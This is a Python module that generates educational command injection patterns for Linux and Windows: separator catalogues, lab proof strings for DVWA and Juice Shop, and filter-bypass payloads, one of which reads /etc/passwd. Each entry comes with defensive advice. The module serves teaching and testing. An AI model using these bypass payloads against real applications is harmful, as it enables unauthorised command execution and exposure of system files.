"""
Command Injection Payload Module - Educational Pattern Generator

Reference: OWASP Command Injection
https://owasp.org/www-community/attacks/Command_Injection

DEFAULT MODE (template):
- Outputs tokenized patterns for learning (non-operational templates)

LAB MODE:
- Outputs safe proof strings suitable for DVWA/Juice Shop screenshots
- Still examples only (no auto sending)

This module focuses on:
- OS selection: Linux vs Windows vs both
- Command separators as strings
- Why filters fail (defensive notes)
- Bypass concepts (whitespace, quote splitting, caret escape, etc.)
"""

from typing import List, Dict


class CMDIPayloadGenerator:
    """Generate educational command injection patterns"""

    def __init__(self, os_type: str = "linux"):
        self.os_type = (os_type or "linux").lower()

    # -----------------------------
    # Public
    # -----------------------------
    def generate_all_patterns(self) -> List[Dict]:
        items: List[Dict] = []

        # Core concepts (tokenized templates)
        items.extend(self._separator_catalog())
        items.extend(self._why_filters_fail())

        # OS-specific patterns (tokenized + lab-friendly examples)
        if self.os_type in ("linux", "both"):
            items.extend(self._linux_templates())
            items.extend(self._linux_lab_proofs())

        if self.os_type in ("windows", "both"):
            items.extend(self._windows_templates())
            items.extend(self._windows_lab_proofs())

        # Cross-platform bypass patterns (still just strings, clearly marked)
        items.extend(self._bypass_patterns())

        return items

    # -----------------------------
    # Helpers
    # -----------------------------
    def _item(
        self,
        *,
        os_name: str,
        subtype: str,
        title: str,
        payload: str,
        description: str,
        bypass_explanation: str = "",
        defensive_notes: str = "",
        lab: bool = False,
    ) -> Dict:
        return {
            "type": "Command Injection",
            "subtype": subtype,
            "os": os_name,
            "title": title,
            "payload": payload,
            "description": description,
            "bypass_explanation": bypass_explanation,
            "defensive_notes": defensive_notes,
            "is_example": True,
            "lab_suitable": bool(lab),
            "labels": ["EDUCATIONAL", "PATTERN_BASED"] + (["LAB_PROOF"] if lab else ["TEMPLATE_ONLY"]),
        }

    # -----------------------------
    # Separator catalog
    # -----------------------------
    def _separator_catalog(self) -> List[Dict]:
        linux_seps = [";", "|", "||", "&", "&&", "\\n", "`...`", "$(…)"]
        win_seps = ["&", "|", "||", "&&", "\\n", "^ (escape)"]

        return [
            self._item(
                os_name="Linux/Unix",
                subtype="Separator Catalog",
                title="Common Linux/Unix command separators (strings only)",
                payload=" / ".join(linux_seps),
                description="Reference list of common separators and shell features used in command injection.",
                bypass_explanation="Filters that only block one separator (e.g., ;) can be bypassed with others (&&, |, newline, etc.).",
                defensive_notes="Do not rely on denylist filtering for separators. Avoid shell invocation (shell=False).",
            ),
            self._item(
                os_name="Windows",
                subtype="Separator Catalog",
                title="Common Windows cmd.exe separators (strings only)",
                payload=" / ".join(win_seps),
                description="Reference list of separators and parsing tricks in Windows cmd.exe contexts.",
                bypass_explanation="Blocking & alone is insufficient: &&, ||, | may still chain commands.",
                defensive_notes="Avoid cmd.exe when possible. Use safe process APIs with argument arrays.",
            ),
        ]

    # -----------------------------
    # Why filters fail
    # -----------------------------
    def _why_filters_fail(self) -> List[Dict]:
        return [
            self._item(
                os_name="All",
                subtype="Defense Strategy",
                title="Why input filters fail against Command Injection",
                payload="N/A",
                description="High-level explanation: attackers can use many encodings, separators, and parsing edge-cases.",
                bypass_explanation=(
                    "Denylist filters lose because shells have flexible parsing rules: alternate separators, "
                    "whitespace tricks, quoting, environment expansion, and encoding/normalization issues."
                ),
                defensive_notes=(
                    "Best practice:\n"
                    "1) Avoid shell execution entirely.\n"
                    "2) Use safe APIs: subprocess.run([...], shell=False).\n"
                    "3) Strict allowlists for expected values (e.g., hostname as regex).\n"
                    "4) Least privilege + containerization.\n"
                    "5) Logging/monitoring and anomaly detection."
                ),
            )
        ]

    # -----------------------------
    # Linux templates (tokenized)
    # -----------------------------
    def _linux_templates(self) -> List[Dict]:
        # Tokenized patterns (non-operational learning templates)
        return [
            self._item(
                os_name="Linux/Unix",
                subtype="Template",
                title="Template: separator chaining concept",
                payload="[[USER_INPUT]] [[SEP]] [[CMD]]",
                description="Tokenized pattern: user input breaks into command context then appends a command via separator.",
                bypass_explanation="If the application uses a shell, separators can change control-flow of the command line.",
                defensive_notes="Use subprocess with shell=False and allowlist inputs.",
            ),
            self._item(
                os_name="Linux/Unix",
                subtype="Template",
                title="Template: newline separator concept",
                payload="[[USER_INPUT]]\\n[[CMD]]",
                description="Tokenized pattern: newline can terminate one command and start another in some contexts.",
                bypass_explanation="Filters that only remove ';' might miss newline characters.",
                defensive_notes="Strip/deny control characters. Prefer safe APIs that don’t invoke a shell.",
            ),
            self._item(
                os_name="Linux/Unix",
                subtype="Template",
                title="Template: command substitution concept",
                payload="[[USER_INPUT]] $( [[CMD]] )",
                description="Tokenized pattern: command substitution can execute nested commands in some shells.",
                bypass_explanation="Even if separators are filtered, substitution may still execute.",
                defensive_notes="Denylist approaches are fragile. Avoid shell evaluation entirely.",
            ),
        ]

    # -----------------------------
    # Linux lab proofs (safe “proof” strings)
    # -----------------------------
    def _linux_lab_proofs(self) -> List[Dict]:
        # DVWA "Command Injection" commonly runs something like ping <input> with shell.
        # These are classic proof commands for screenshots.
        proofs = [
            ("Proof: whoami", "; whoami", "Shows current user output in response."),
            ("Proof: id", "&& id", "Shows uid/gid; good for proof screenshot."),
            ("Proof: uname", "| uname -a", "Shows kernel/system info output."),
            ("Proof: newline", "\\nwhoami", "Newline separator attempt (context-dependent)."),
            ("Proof: time delay", "&& sleep 3", "Time-based proof: page delays (useful if output isn’t shown)."),
        ]

        out: List[Dict] = []
        for title, payload, desc in proofs:
            out.append(
                self._item(
                    os_name="Linux/Unix",
                    subtype="Lab Proof",
                    title=title,
                    payload=payload,
                    description=desc,
                    bypass_explanation="Use as authorized DVWA/Juice Shop lab proof only.",
                    defensive_notes="Disable shell usage; validate/allowlist input.",
                    lab=True,
                )
            )
        return out

    # -----------------------------
    # Windows templates (tokenized)
    # -----------------------------
    def _windows_templates(self) -> List[Dict]:
        return [
            self._item(
                os_name="Windows",
                subtype="Template",
                title="Template: Windows separator chaining concept",
                payload="[[USER_INPUT]] [[SEP]] [[CMD]]",
                description="Tokenized pattern for cmd.exe chaining via &, &&, ||, |.",
                bypass_explanation="cmd.exe parses metacharacters; chaining changes execution flow.",
                defensive_notes="Avoid cmd.exe; use safe process APIs with argument lists.",
            ),
            self._item(
                os_name="Windows",
                subtype="Template",
                title="Template: caret escape concept",
                payload="[[USER_INPUT]] & wh^o^a^m^i",
                description="Tokenized Windows escaping idea: caret can change parsing and bypass naive matches.",
                bypass_explanation="Filters matching exact tokens may fail when escape chars are inserted.",
                defensive_notes="Normalize before validation; prefer allowlists and avoid shells.",
            ),
            self._item(
                os_name="Windows",
                subtype="Template",
                title="Template: case variation concept",
                payload="[[USER_INPUT]] & WhOaMi",
                description="Windows commands are often case-insensitive, while filters might not be.",
                bypass_explanation="Case-sensitive filtering is fragile.",
                defensive_notes="Normalize to one case before checks; but better: no shell execution.",
            ),
        ]

    # -----------------------------
    # Windows lab proofs
    # -----------------------------
    def _windows_lab_proofs(self) -> List[Dict]:
        proofs = [
            ("Proof: whoami", "& whoami", "Shows current user output in response."),
            ("Proof: ipconfig", "&& ipconfig", "Shows network config output."),
            ("Proof: dir", "| dir", "Shows directory listing output."),
            ("Proof: time delay", "&& timeout /T 3", "Time-based proof: adds delay."),
        ]

        out: List[Dict] = []
        for title, payload, desc in proofs:
            out.append(
                self._item(
                    os_name="Windows",
                    subtype="Lab Proof",
                    title=title,
                    payload=payload,
                    description=desc,
                    bypass_explanation="Use as authorized lab proof only.",
                    defensive_notes="Avoid cmd.exe usage; strict allowlists.",
                    lab=True,
                )
            )
        return out

    # -----------------------------
    # Cross-platform bypass patterns (still examples, strings only)
    # -----------------------------
    def _bypass_patterns(self) -> List[Dict]:
        patterns = [
            ("Quote insertion", '";w"h"o"a"m"i"', "Quotes may break naive string matching while shell concatenates."),
            ("Whitespace abuse (IFS)", ";who$IFS$9ami", "$IFS may expand to whitespace in some shells."),
            ("Backslash splitting", r";who\ami", "Backslash tricks can bypass naive token checks in some contexts."),
            ("No-space redirection", ";cat</etc/passwd", "Redirection can work without spaces in shells."),
            ("Windows caret escape", "&who^ami", "cmd.exe caret escape can evade naive filters."),
        ]

        out: List[Dict] = []
        for title, payload, desc in patterns:
            out.append(
                self._item(
                    os_name="Multi-platform",
                    subtype="Bypass Pattern",
                    title=title,
                    payload=payload,
                    description=desc,
                    bypass_explanation="These demonstrate why denylist filters are unreliable.",
                    defensive_notes="Prefer safe execution APIs; normalize + strict allowlists if unavoidable.",
                )
            )
        return out
